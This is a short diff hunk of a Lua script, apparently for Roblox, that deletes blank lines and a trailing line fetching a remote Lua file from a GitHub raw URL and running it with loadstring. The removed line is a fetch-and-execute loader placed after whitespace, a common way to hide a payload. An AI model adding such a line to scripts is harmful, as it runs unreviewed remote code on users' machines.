@@ -298,8 +298,4 @@ local function clickStartButton()
 end
 task.wait(0.3)
 clickStartButton()
-
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Adidsus/rb/refs/heads/main/ballsinpocket.lua"))()
 end
